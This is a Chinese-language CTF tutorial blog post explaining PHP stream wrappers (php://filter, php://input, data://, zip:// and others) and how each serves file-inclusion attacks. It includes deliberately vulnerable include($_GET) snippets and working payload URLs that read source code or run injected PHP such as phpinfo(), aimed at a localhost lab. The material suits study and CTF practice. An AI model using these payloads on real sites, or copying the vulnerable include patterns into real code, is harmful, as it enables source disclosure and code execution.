---
title: PHP伪协议
layout: categories
date: 2020-03-16
tags: [CTF, PHP]
categories:
- [CTF, PHP]
comments: false
---
# PHP伪协议

## 0x00 何为伪协议

PHP官网的解释:

PHP 带有很多内置 URL 风格的封装协议，可用于类似 [fopen()](https://www.php.net/manual/zh/function.fopen.php)、 [copy()](https://www.php.net/manual/zh/function.copy.php)、 [file_exists()](https://www.php.net/manual/zh/function.file-exists.php) 和 [filesize()](https://www.php.net/manual/zh/function.filesize.php) 的文件系统函数。 除了这些封装协议，还能通过 [stream_wrapper_register()](https://www.php.net/manual/zh/function.stream-wrapper-register.php) 来注册自定义的封装协议。

<!-- more -->

**支持的协议:**

```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

## 0x01 用法

### file://

> PHP.ini：
> file:// 协议在双off的情况下也可以正常使用；
> allow_url_fopen ：off/on
> allow_url_include：off/on

**file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件**

**且不受allow_url_fopen与allow_url_include的影响**

```
//file.php
<?php
if(isset($_GET['file']))
{
    include $_GET['file'];
}
?>
//使用file:// [文件的绝对路径和文件名]来访问文件
http://127.0.0.1/file.php?file=/var/www//html/phpinfo.php
```

### php://

> **php://filter在双off的情况下也可以正常使用；**
> **php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。**

**php:// 访问各个输入/输出流（I/O streams）**

**在CTF中经常使用的是php://filter和php://input**

- **php://filter用于读取源码**
- **php://input用于执行php代码。**

#### php://filter

`php://filter` 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

```
resource=<要过滤的数据流>   这个参数是必须的。它指定了你要筛选过滤的数据流。
read=<读链的筛选列表>       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表>      该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
<;两个链的筛选列表>         任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
php://filter/read=convert.base64-encode/resource=index.php
//可以以base64编码的方式读取index.php的内容
```

##### 过滤器

###### 字符串过滤器

```
string.rot13		等同于用 str_rot13()函数处理所有的流数据
string.toupper		等同于用 strtoupper()函数处理所有的流数据
string.tolower		等同于用 strtolower()函数处理所有的流数据
string.strip_tags	等同于用 strip_tags()函数处理所有的流数据
```

###### 转换过滤器

```
convert.base64-encode	等同于base64_encode()函数处理所有的流数据
convert.base64-decode	等同于base64_decode()函数处理所有的流数据
convert.quoted-printable-encode 没有对应函数
convert.quoted-printable-decode	等同于用 quoted_printable_decode()函数处理所有的流数据
```

###### 压缩过滤器

```
zlib.deflate 压缩
zlib.inflate 解压
```

###### 加密过滤器

mcrypt

mdecrypt

用的不多,不说了

#### php://input

**php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。**

**注：enctype=”multipart/form-data” 的时候 php://input 是无效的。**

> allow_url_fopen ：off/on
> allow_url_include：on

payload

```
url:http://127.0.0.1/file.php?page=php://input
//postdata
a=<?php phpinfo();?>
```

实例

```
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
解法为  url/index.php?user=php://input  
[POSTDATA] the user is admin
最后输出为hello admin!并且包含对应文件
```

#### php://output

是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。

payload

```
#file.php
<?php  
$code=$_GET["page"];  
file_put_contents($code,"test");   
?>
url:http://127.0.0.1/file.php?page=php://output
//结果输出test
```

### data://

data:资源类型;编码,内容
数据流封装器
当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行

> PHP.ini：
> data://协议必须双在on才能正常使用；
> allow_url_fopen ：on
> allow_url_include：on
> php 版本大于等于 php5.2

payload

```
$file.php
<?php  
$filename=$_GET["a"];  
include("$filename");  
?>
http://127.0.0.1/file.php?a=data://text/plain,<?php phpinfo()?>
or
http://127.0.0.1/file.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

### zip://, bzip2://, zlib://

> PHP.ini：
> zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；
> allow_url_fopen ：off/on
> allow_url_include：off/on

```
3个封装协议，都是直接打开压缩文件。
compress.zlib://file.gz - 处理的是 '.gz' 后缀的压缩包
compress.bzip2://file.bz2 - 处理的是 '.bz2' 后缀的压缩包
zip://archive.zip#dir/file.txt - 处理的是 '.zip' 后缀的压缩包里的文件
```

**注：zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。**

#### zip://

php 版本大于等于 php5.3.0

payload

```
zip://archive.zip#dir/file.txt

zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]**
要用绝对路径+url编码#
```

#### bzip2://

payload

```
compress.bzip2://file.bz2
相对路径也可以
```

示例

```
用7-zip生成一个bz2压缩文件。
pyload:http://127.0.0.1/file.php?a=compress.bzip2://test.bz2
或者文件改为jpg后缀
http://127.0.0.1/file.php?a=compress.bzip2://test.jpg
```

#### zlib://

同理